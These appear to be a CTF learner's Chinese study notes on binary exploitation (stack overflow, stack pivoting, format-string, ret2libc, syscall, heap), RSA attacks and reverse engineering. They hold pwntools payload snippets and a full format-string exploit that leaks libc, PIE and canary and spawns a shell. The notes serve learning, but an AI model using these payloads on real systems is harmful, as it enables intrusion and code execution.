**与64位的区别在于不用pop rdi;ret，同时返回地址，参数地址，函数调用地址不一样**

```
p32(函数plt地址)+'aaaa'（随意的函数返回地址）+p32(参数地址（多为字符串/bin/sh的地址）)
对于打印的函数，需要正常退出，返回地址应为exit地址
```

**注意在栈溢出中的跳转到带参数的函数的时候，要让程序正常退出，函数的返回地址应该写为exit的地址（函数名含exit）即退出函数**

### 3.判断缓冲区溢出字符输入

1.利用ida打开pwn文件后，双击进入要输入的变量，看它与底部差距多少个字节就输入多少，一般栈底为r

2.利用pwndbg（目前存在一些pwn文件~~好像是多线程~~，用此方法不行）

```
pwndbg 文件名 //利用pwndbg打开文件
cyclic 200 //随机模拟200个字符
start //运行文件
//将cyclic模拟的字符复制粘贴输入，之后文件会报错，弹出一堆东西
找到rbp(64位)或者ebp(32位)
cyclic -l rbp/ebp
得出的数字即为到rbp/ebp之前的溢出字符个数，一般情况将这个数字加上ebp就是偏移(注意有些没有加入ebp之类的，不需要加上覆盖ebp的字符)
//32位下有时候会有无效字符，或者eip，此为总输入
```



### 3.保护机制

#### 1.canary栈保护

为了控制栈的返回值，设置canary值，由于canary值低于栈底，因此在覆盖栈底指针的时候一定会先覆盖掉canary的值，因此可以通过canary与标定的值进行检验从而避免栈的溢出

==**canary一般以00结尾**==



#### 1.暴力破解

对于多线程有用

由于子线程程序崩溃不会影响主程序的进行，因此可以在分线程进行暴力破解，泄露出canary从而在构造payload的时候将原本属于canary的地址覆盖位泄露出来的代码

#### 2.同时修改TSL和canary



## 四、栈转移基本

### 1.使用条件

在栈溢出中，存在可覆盖空间不足，或者栈上无法执行，换句话说，可利用的空间只有rbp(或ebp)以及ret，遇见这种情况考虑将rsp指针移到一个可用的空间区域，从而变成一个新的“栈”进行栈溢出，具体可以移到bss段，变量空间等等，迁移到最后类似于一个没有rbp，只有rsp的栈空间

### 2.基本原理

在函数调用的时候，会存在push rbp, mov rsp rbp的操作，因为，利用两次leave操作就可以做到修改rsp的办法，从而将rsp移到一个有着足够空间进行溢出的地方

### 3.基本步骤（思考步骤而不是payload）

1.利用printf等输出函数泄露ebp的地址（一般情况下是在进行函数调用，因此此时的ebp里面存的值是main函数的ebp（以下称为old-ebp）），在pwndbg里面进行调试，从而找到可以利用空间的位置

```
比如我们需要进行溢出的空间是一个变量空间的时候
利用old-ebp 减去 偏移地址得到
比如在程序中输入'aaaa'，然后在pwndbg中输入 b*加上地址打断点，然后输入stack加数字进行栈空间查看（注意打断点的时候有个星号）
```

2.泄露出old-ebp地址以及找到可控空间的位置之后，利用ROPgadget找到leave,ret的位置，将其覆盖在ret处（此处泄露old-ebp的地址只是为了通过偏移得到变量空间的地址）

3.最后构造payload即可

**注意，上述为测试和思考步骤，而非payload步骤，因为存在栈空间顺序问题，比如在一个变量空间进行构建，那么一开始是进行变量输入，而此处就应该进行溢出payload构建，最后在覆盖ebp和ret**

### 4.payload构建

注意点:

对于覆盖的ret而言，采用了leave,ret进行覆盖，其中会有个pop ebp的操作，所有在一开始对操作空间进行payload的构建时，需要输入无关字符去进行pop ebp，**比如32位下输b'aaaa'进行操作**



对于一些函数需要输入参数，比如system需要输入/bin/sh而言，注意，**函数参数传递一定是地址**

因此如果要在此空间构建一个system(/bin/sh)而言（32位下），步骤如下：

```
//前面一系列payload不管
payload = b'aaaa' //消除pop ebp的影响
payload += p32(elf.plt['system']) //此处“空间”地址为a
payload += b'aaaa' //作为返回地址 此处空间位a + 4
payload += p32(a + 12) //此处为传参，地址为a + 8，需要在栈空间查找，因此查找下一个地址，其中a + 12为写入参数的地址，根据不同的题可以进行更改
payload += b'/bin/sh\x00' //此处地址为a + 12，给system提供参数查询 
最后，如果在变量空间进行溢出，假设变量空间大小为0x28，而输入的字符不够0x28
payload = payload.ljust(0x28, b'a')//，注意此处为=号，而不是+=号，此代码表示将payload补充到0x28个（大小可更改），不足用'a'进行补充
payload += p32(new_ebp) //需要劫持空间的地址
payload += p32(leave_ret)
//最后两行就是进行ebp和ret的覆盖，也就是上述思路
//上述地址需要进行手动计算
```

### 5.bss段转移和一些注意事项

leave中存在一个pop rbp，因此，我们转到bss的时候，首先再原来的rbp处放入bss，然后ret处放入程序中的read，因为read是根据rbp进行查找读写的，就会写入bss段

然后程序会按照read之后的流程运行，这一次我们就将rbp覆盖为bss - 0x8，为什么要减去（此处是为了消耗pop rbp，如果还要进行栈转移，那么就不用减，而是一开始写入下一个栈rbp要去的位置）**此处注意，bss - 0x8只是消耗pop rbp，如果是read，read会在rbp - x的位置写入，因此应该写入bss - (0x8 + x)**，是因为我们返回值要覆盖为leave，而leave中存在一个pop rbp的指令，需要消除，而为什么程序会有一个leave，我们还需要写一个leave，是因为栈是看rsp的，leave会移动rsp到rbp的位置，第一个会移动到下面，我们只有再写一个leave才能保证rsp到我们的bss段

例如：

```
payload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)
payload = payload.ljust((0x20 - 0x8), b'a')
payload += p64(canary)

payload += p64(bss - 0x28)
//此处为什么是bss-0x28
//bss-0x20，是因为前面read写入是写在bss-0x20的，而多减去0x8是因为消耗pop rbp，因此是减去0x28
```



## 五、格式化字符串

### 1.使用条件

多半无法进行栈溢出，存在读入字符串和printf打印字符串操作

例如：

```
printf(&buff)或者printf(buff)
```

使用格式化字符串漏洞可以直接泄露flag，目标地址以及canary等等

### 2.基本内容：

基本格式：%+数字+$+type //表示对第（数字）个变量进行type操作

例如：

```
%10$n //表示写入第十个参数
```

其中数字和$可以省略

**<u>type</u>**类型：
%n：将已经输出的字符的==个数==输入进参数中

```
printf("%test%n",&a) //将test字符的个数输进a中。所以结果为a = 4
```

%p：输出指针的地址

### 3.基本payload

1.首先在pwndbg中运行程序

2.输入下列代码进行测试

（在32位下测试：）

```
AAAA %p-%p-%p-%p....(一堆%p)-%p
```

3.找到回显中存在0x414141或者有0x...414141格式的返回值，除开AAAA，数出地址到0x414141的个数（即数出0x414141这类在第几个位置），此位置就是可以进行修改和控制的，也就是说，我们的输入会从这个地方开始放置

4.在计算出位置，假设为k后，对于要修改的地址进行查找，假设要修改一个data（dw类型，2个存储），其中data_addr为data的地址，则有payload为：

```
payload = p32(data_addr) + p32(data_addr + 1) + b'%k$n%(k+1)$n'
//先输入地址，表示要修改的地址，此代码就会修改data_addr和data_addr + 1的值，即是修改数据data的值，内容则为p32(data_addr) + p32(data_addr + 1)的字符个数，由于p32会产生4个字符，所以在%n之前一共产生了8个字符，所以data最终的数据为0x0808，考虑现实情况，如果需改到0x04，则payload可为p32(data_addr) + b'%k$n%'

payload解释：此处放入data_addr，会直接放在上述回显0x414141这类字符串的位置，而之后用%k定位到这个位置进行修改，如果p32(data_addr)的字符个数不满足条件绕过，则使用'a'字符进行补齐
```

如果需要将某个函数的got地址直接改为plt地址，比如说存在atoi函数，我们直接将atoi改为system，将可以直接根据read输入的数据构造system(/bin/sh)

```
payload=fmtstr_payload(10,{atoi_got:system_plt})
其中的10是我们输入变量处于的偏移位置
```



### 4.偏移计算

**==上述这个说的偏移的寻找并不完全需要这种，偏移的定义如下：==**

```
格式化字符串中的偏移，比如我们需要确定输入的变量在第几个参数中，这其实指的是输入的变量在printf函数栈帧上，从输入变量开始之后的第几个位置
也就是说，偏移是相对于本来就要输出的那个变量（在栈里面存储的是地址），我们需要找到这个地址在栈上哪里，也就是计算这个地址和我们正常输出的数据之间的偏移
```

比如我们输入

```
AAAA %p-%p-%p
假设回显为
AAAA -0xffd3a5b8 -0x63 -(nil)
此时第一个地址为原本变量AAAA之后的那个栈的地方
```

如图：
![image-20250801145102013](C:\Users\24536\AppData\Roaming\Typora\typora-user-images\image-20250801145102013.png)

输出结果这样计算的：

```
输出的AAAA表示我们输入的变量，也就是图中第二行，也可以看成输出的AAAA是%0$p，然后第一个%p是图中第三行，依次类推，所以题中我们输入的AAAA存放在0b:002c,也就是12行，而我们是从第二行开始输出的，所有变量所在的位置的相对拍偏移就是10
```

而对于64位程序：
假设如下：
![image-20250801145418721](C:\Users\24536\AppData\Roaming\Typora\typora-user-images\image-20250801145418721.png)

```
因为64位存放的问题，所有第一个参数，也就是我们真正输出的那个参数在rdi中，因此后续还有五个寄存器，第一行是返回值一定不会输出，所有栈上第二行开始相对偏移是6，后续计算即可
```

**其中如果为dd（双字类型，4个存储），则需要计算k,k+1,k+2,k+3,以此类推**

**如果为64为，则在输如AAAA时要输入8个（因为64为一个存储为8个字节），同时后面进行字符串转化时要用p64()**

### 5.特殊说明

格式化不仅能泄露pie，canary，libc，甚至能在开启pie的情况下去控制流程，也就是修改ret，注意有一个点，输入的参数只会覆盖栈，而不会往后推理，也就是说，一开始在后面找到的参数位置不会因为你输入的字符串而改变

！！注意，由于要精准计算要打印的字符，因此我们不用$p进行泄露，而是用

```
%21$016lx
//表示输出第21个参数，输出16个字符，16进制
```

其次

控制流程应为：

```
根据题目给出的gift，也就是一些地址，找到和ret之间的偏移，将ret写在栈上，调试看ret在第几个参数（注意这个不是rbp下面的那个ret，而是我们写进去的字符串的ret），然后利用c%数字$hhn进行修改（$hhn修改低8位，也就是一个字节，比如0xcd，$hn修改16位，比如0x12cd）

此处我们要根据以及打印的字符去进行数量差距的补充，因为格式化字符串是:将打印出来的字符数量写进参数中

！！！
最关键的一点，顺序问题，也就是payload的顺序！
1. 泄露libc，pie,canary
2. 打印字符的数量以及要修改的ret的参数（这个地方再调试的时候可以随便写一个占位，然后调试查看参数位置，再进行修正）
3. 对齐（这一步是让写入的ret重新占一个栈空间，否则程序不正确）
4. 写入ret的地址
```

一个完整的exp如下：

```
p.recvuntil(b'gift:')
gift_line = p.recvline().strip()
buf_addr  = int(gift_line, 16)
ret_addr_loc = buf_addr + 0x68
//此处接收计算ret的地址

leak_fmt = b"%21$016lx%43$016lx%19$016lx"
//泄露libc,pie,canary

target_low16 = 0xCD
already = 48 
//这个是已经打印了48个字符，因为前面是$016lx，一共有3个，因此已经打印了48个字符

need = (target_low16 - already) & 0xffff
//计算除了已经打印的字符之外还少多少个，此处need是数字

write_fmt = b"%" + str(need).encode() + b"c%13$hhn"
//进行补充，str(need).encode()是将其转换为字节，比如157转换为b'157'


L = len(leak_fmt) + len(write_fmt)
pad_len = (8 - (L % 8)) % 8 
pad = b"A" * pad_len
//这个是用来8字节对齐的，就是怕之前写的不够8字节，导致返回地址不能重新出现在一个新的字节处，而出现混乱

payload = leak_fmt + write_fmt + pad + p64(ret_addr_loc)
```



## 六、ret2libc

头文件：

```
from LibcSearcher import * 
```

一开始对文件进行初始化

```
elf = ELF("pwn文件路径")
```

之后的函数进行如下查找

```
elf.plt['函数名'] // 函数的plt地址
elf.sym['函数名']特殊的，对于用户自己定义的函数用这个进行查找
对于这种查找，对于write这种系统函数而言，elf.plt = elf.sym
elf.got['函数名'] // 函数的got地址
```

### 1.使用条件

在给出的文件中没有system,bin/sh等等可以直接得到答案或者shell的后门函数，需要进行plt和got表**(got表的地址并不等于真实地址，真实地址是got表中存储的地址)**，（==真实地址每次运行时都会改变==）的提取以及libc库的查询进行函数的构建，主要关系为：

```
函数真实地址= libc基地址 + 偏移地址
```

查找到libc库之后，偏移地址为**libc.dump()**

```
libc.dump("system")//此为函数偏移地址的寻找
libc.dump("str_bin_sh")//此为字符串的寻找，要加str_
```

以上位使用LibcSearch进行查找后的代码

==**对于题目给出**==，使用

```
libc = ELF("文件路径")
```

这种方式得到的libc库

```
libc.sym['system'] // 函数偏移地址
next(libc.search(b"/bin/sh")) // 字符串寻找(next表示取第一个)
```

### 2.使用内容

#### 1.泄露一个函数的真实地址：

以64位为例，题目没有给出libc库为例子：

将got表内容的地址打印出来，为

```
payload += pop_rdi + 函数_got + put_plt + main_adr
```

此为打印一个函数的got表的值，即真实地址，可以用put或者write等，最后一定要回到main函数进行第二次溢出

#### 2.找到libc库

##### 1.接受函数真实地址

接受上文put打印（或者write打印）的真实地址：

```
函数_rel = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
//64位
函数_rel = u32(p.recv()[0:4])
//32位
//在 32 位系统中，地址通常以 0xf7xxxxxx 或 0xe6xxxxxx 开头

//注意p.recvuntil()和 p.recv()的区别
比如:
p.recvuntil('b')
x = u32(p.recv()[0:4])
和
x = u32(p.recvuntil('b')[0:4])
上面的一组代码表示接收到b字符之后，再接收后面出现的4个字符（不包括b）[即是接收回显之后的数据]
下面的一组代码表示接收到b字符，在接收到的字符中取前4个字符[即是接受回显的数据]
```

此为函数的真实地址

##### 2.然后查找libc库：

```
libc = LibcSearcher("函数名字"，函数_rel(上文泄露出来的函数真实地址))（此处泄露出函数和输入的函数名字要统一）
```

**在进行payload的sendline后，有可能存在多个libc满足条件，要一个个试**

##### 3.计算出libc的基地址：

```
libc_adr = 函数_rel - libc.dump("函数名")
```

##### 4.需要函数的真实地址：

```
例如systme:
sys_adr = libc_adr + libc.dump("system")
```

之后就正常构建payload即可

## 七、系统调用

一种除了system(bin/sh)的另外一种得到shell的方法，即系统调用函数得到shell

**一般使用条件：**
题目中没有put等等函数，也就是说找不到libc，或者说构造不出system(bin/sh)，（因为构造这个函数需要一些函数的地址，而题目中没有），此时考虑系统调用csu，也就是利用execve("/bin/sh", NULL, NULL)得到shell

其中下文提到的**Linxu系统调用号表**需要在网上进行查找对应的数字

### 1.基本原理：

#### 1.32位下：

系统调用中的 execve("/bin/sh", NULL, NULL)获得shell。我们可以在 **Linxu系统调用号表** 中找到对应的系统调用号,进行调用, 其中32位程序系统调用号用 eax 储存（即使eax的数值等于要调用函数的的数值，例如execve为eax = 11）, 第一 、 二 、 三参数分别在 ebx 、ecx 、edx中储存。 用 int 80 汇编指令调用

#### 2.64位下：

系统调用中的syscall获得shell，64位程序系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 rdi 、rsi 、rdx中储存

```
流程
mov_rax存放使得rax值为59（0x3b）的程序，同时要有ret
paylaod = p64(mov_rax) + p64(rsi,rdx)//p64(rsi,rdx)是将rsi和rdx变为0的程序
payload += p64(pop_rdi) + 'bin/sh'(此时bin/sh/很有可能是写入变量了的，那么这里就用变量的栈地址)
```



## 八、整数型溢出

### 1.基本原理

在文件进行变量转换的时候，存在有符号型和无符号型转化的溢出

关键点在于有符号型有负数，而无符号型没有负数

有符号型的负数转换为无符号型时会转换为正数并且范围溢出

例如：

```
//源文件：
scanf("%d", a)
if((int)a > 10)
	exit(0)
read(0, fd, (unsigned int)a)
```

此文件存在利用有符号型进行溢出

```
输入：-1
在有符号下可以绕过if((int)a > 10)
而之后转换为无符号型，a从-1会变成一个较大的整数
所有存在栈溢出
```

## 九、静态链接

程序为静态链接，不能ret2libc去找到Libc库进行攻击

特点：ida反汇编之后左边全为表函数

![image-20250728111924316](C:\Users\24536\AppData\Roaming\Typora\typora-user-images\image-20250728111924316.png)

（没有粉红色标注的函数）

此时就是静态链接构造系统调用：
方法：

```
注意导入库函数from struct import pack
ROPgadget --binary pwn --ropchain得到系统产生得payload
然后在p = b''处进行偏移得填充即可
```

## 十、随机数溢出

原理，在随机数rand()被调用的时候，会去寻找srand(seed)函数，换句话说，如果seed是个定值，那么在运行完srand(seed)之后，每次运行rand()产生的随机数都是一样的

因此，我们可以考虑在脚本中覆盖seed，然后运行一遍srand(seed)，在运行rand()，然后记录下rand()产生的值，之后构造payload输入记录的值即可成功绕过随机数

```
//此处libc进行修改：
libc = cdll.LoadLibrary("libc.so.6")
//和libc = ELF('./libc.so.6')的区别：
第一个代码使得我们可以在脚本中调用动态库里面的函数，注意，他没有写进栈里面，也就是说是我们脚本的运行而非程序交互运行
第二个代码实际上是写入payload的逻辑，也就是程序交互的运行，需要写进栈里面调用函数，然后程序流程会被劫持
```

```
基本payload:
payload = b'a'*offset(变量到seed被覆盖直接的距离)
payload += p64(0) //覆盖seed
libc.srand(seed)//也就是覆盖的值
res = []
for i in range(range):
	rand = libc.rand() //只是为了重命名
	res.append(rand) //此处根据他对随机数的操作进行修改
..... //其余payload
for i in res:
	p.sendline(str(i)) // 写入对应的随机数
```



## 十一、堆溢出

为什么 0x7f 等效于 0x71 ？因为 flag 位自动截取低位，也就是 0111 1111 的低位自动被截取成 0111 0001，前面 3 个 1 不会影响 flag 位的判断

**~~此处有一点，由于flag位是后三位，因此似乎只要是0x7x，比如0x7a，0x7b似乎截取之后都是0x71~~**

size 字段。是用来指示当前堆块的大小的（头部加上 user data 的大小）。但是这个字段的最后三位相当于三个 flag ，有另外的作用。

释放一个不属于 fast bin 的 chunk，并且该 `chunk` 不和 top `chunk` 紧邻时，该 `chunk` 会被首先放到 unsorted bin 中

unsortbin 有一个特性，就是如果 usortbin 只有一个 bin ，它的 fd 和 bk 指针会指向同一个地址(unsorted bin 链表的头部），这个地址为 main_arena + 0x58

p位**用来记录前一个 chunk 块是否被分配，被分配的话这个字段的值为 1**，所以经常会在已分配的堆块中的 size 字段中发现值比原来大 1 个字节。

同时，chunk的总大小会加0x10，，也就是prev_size和size，每个各占0x8

prev_size：如果该chunk的物理相邻的前一个chunk是空闲的，那就用来记录前一个chunk的大小，否则的话用来储存前一个chunk的数据，这也就是prev_size的复用

所以按照按照chunk的大小将其free进Bins的时候，不仅仅是malloc的大小，还要加上0x10

假设申请了一个0x10的堆大小：
形式如下：
![image-20250716170412331](C:\Users\24536\AppData\Roaming\Typora\typora-user-images\image-20250716170412331.png)

这个里面申请了两个块，一个0x10, 一个0x20，其对应的地址就是addr，也就是给这个chunk开的空间

具体如下：
![image-20250716170554616](C:\Users\24536\AppData\Roaming\Typora\typora-user-images\image-20250716170554616.png)

```
此处输入，对于一行的0x而言，是从左到右，对于一个0x而言，是从右到左
例如：
0x0000000000000000      0x0000000000000000
输入'happy'
显示为：
0x0000007970706168      0x0000000000000000
就是对于一行为从
```

这是两个chunk的结构，其中以第一个为例子，第一行左边0x0000...是prev_size，然后右边0x0000....021是size，下面一行也就是给chunk开的大小，也就是use_data了

```
find_fake_fast 0x7ffff7bc3b10 0x7f #寻找符合条件的fake_chunk
x/10gx (long long)(&main_arena)-0x30 #寻找malloc_hook
x/10gx (long long)(&main_arena)-0x30+0xd #寻找realloc_hook
```

### fastbin

**后进先出机制**

fastbin中每个free的块会根据其的大小放在不同的行

```
比如申请3个8字节的大小的堆和2个16字节的堆
node 0(8)
node 1(8)
node 2(16)
node 3(8)
node 4(16)
那么加上前置的heap的p_size和size的8个字节后，实际上是16字节和24字节
那么fastbin中应该是
0x10  node 3 -> node 1 -> node 0
0x18  node 4 -> node 2

```

![image-20251016112041496](./../../AppData/Roaming/Typora/typora-user-images/image-20251016112041496.png)

如上，每一行的链表是相同大小的堆块，不同大小即使顺序相连接，任然是在不同行

![image-20251215114152926](./../../AppData/Roaming/Typora/typora-user-images/image-20251215114152926.png)

```
这是两个0x60的堆，下面那个被free，上面那个依旧存在
其中0x16e4a0f0那个地方，由于此chunk被free，则他就代表fd，如果没有被free，则就是data，堆溢出的时候控制fd就是控制这个位置，0x16e4a0e0处随便溢出，0x16e4a0e8处大小需要正确统一，然后下面就是0x60个数据，算上0x16e4a0e0一共是0x70
```

堆的一个顺序

堆地址（一般书数组）存放一个空间地址，空间地址里面存放一个数据

比如一些chunk为heaparray[]

heaparray[i]中存放的是空间地址，假设为a

a中存放的就是数据了

此处区分一下heaparray[i]中的地址a和pwngdb中heap出来的addr地址的区别

a = addr + 0x10

因为addr是算上size和prev的，多加了0x10，而空间地址a直接是从真实data开始

![image-20251216110032075](./../../AppData/Roaming/Typora/typora-user-images/image-20251216110032075.png)

如上图，heaparray左边是heaparray自己数组的地址，里面存放的是malloc的空间地址，每个都为addr + 0x10（至于最后一个6020bd只是因为他是一个依旧有的地址所有不在heap中显示，但本质也是一个malloc的chunk）

![image-20251216110216917](./../../AppData/Roaming/Typora/typora-user-images/image-20251216110216917.png)

在空间地址中便是存放的数据了

联动：
一般情况edit堆数据，就是修改空间地址a里面的数据data，也就是

```
a: xxxxx，修改的是xxxx，修改为yyyy
原本是a -> xxxx，修改成a -> yyyy
最明显的例子
funcA.got-> funcA.plt
可以修改为
funcA.got -> funcB.plt
也就是进行got表的修改，调用funcA的名字实际调用的是funcB的函数

整个具体流程，由于要用到edit，而edit的流程是在堆地址里面找到那个空间地址a，将空间地址a里面的data进行修改
因此，想要修改got表只需要将funcA.got写进一个chunk中，edit此chunk即可
```



# Crypto基础

## 1.RSA加密：

### 1.RSA加密原理：

#### 符号表示：

明文：m（需要加密的文本）

密文：c（加密后的文本）

公钥：e（一个整数，加密的密钥）

私钥：d（解密需要的密码，用来解密的，不公开）

两个很大的素数：p, q

#### 加密过程：

1. $n = p * q$
2. $c = m^emodn$

#### 解密过程：

1. 求出d：$e*d ≡ 1(mod(p - 1)(q - 1))$

2. $m = c^dmodn$

   

**不难发现，考虑到e一般情况下给出，其实只要知道了p和q就可以进行解密运算，因此求出q,p为主要工作**

在得出q,p后，基本代码为：

```
import gmpy2
d = gmpy2.invert(e, (p - 1)*(q - 1)) // 计算e的逆元d
//gmpy2.invert(a, b)表示计算a模b的逆元
m = pow(c, d, n)
```

### 2.RSA情况：

#### 1.n已知且较小，可因式分解

只需要将n进行因式分解即可，利用**yafu**进行因式分解得出p和q，再按照上述步骤进行即可。

```
进入yafu文件夹
在文件夹内打开终端
输入./yafu-x64
输入factor()即可
//括号内输入要分解的数
```

#### 2.n已知但是很大，而e很小

n无法用yafu进行分解，但是e很小

可以考虑公式如下

因为存在 $c = m^emodn,$ 所以有 $m^e = c + kn$，因为e很小，保证了可以用$python$中的**$gmpy2.iroot()$**进行开根号，所以只需要爆破K即可

```
进行循环枚举k
ans = c + k*n
m,l = gmpy2.iroot(ans, e)
//gmpy2.iroot(a, b)表示对a开e次根，返回值有两个，m为开根的值，l为bool值，为1则表示准确
//即使当l为1时，表示可以正确开根（不为1表示结果为近似数）
```

#### 3.多组n和c，e很小

每一组n,c对应一次RSA加密

一般这种情况下，**e很小**，利用中国剩余定理来求出$m^e$。

因为$c ≡ m^emodn可以退出 m^e ≡ c modn$

所以利用python中sympy库的crt()函数进行求解

```
res,mod = crt(n, c)//n, c为列表
//crt(n, c), n为模数，c为余数，返回值res为解，mod为所有n的乘积
然后对于得到的结果res进行开根处理即可以得到m
```

# Reverse

## 1.基本注意事项：

注意程序和IDA对于大小端存放的方式不同，一般在x86中，cpu都是小端序存储，但是IDA转换的字符会变成大端数存储，因此遇见这种情况需要将数据反转

IDA用‘R’键可以将ascii码变为字符

```
例如：
0x776F646168LL
77 -> w, 6f -> o, 64 -> d .....
若为小端序，则上述表示为字符串应为：hadow
若为大端序，则上述表示为字符串应为：wodah

一般情况下均为小端序，即输入的数据从右到左输入，pwn中也是如此
```

## 2.花指令

关键在于反汇编的编译原理是线性

比如说：

```
E8 代表call指令，而后续的4个字节是call指令的地址，但是可以进行jmp指令到call指令的后一个字节，此时，正常程序流程将不会存在call指令，可以正常运行，但是反汇编会因为线性识别到call从而将后续原本属于正常流程的代码看作是call的跳转地址
```

```
区别：
jnz ...
E8(call) ..
（正常流程） ...

正常流程下是jmp指令直接跳到正常流程去进行，而在反汇编的软件中，是jmp之后去反汇编E8，然后发现E8是call指令后将后续正常流程代码的字节看作是call指令的地址
```

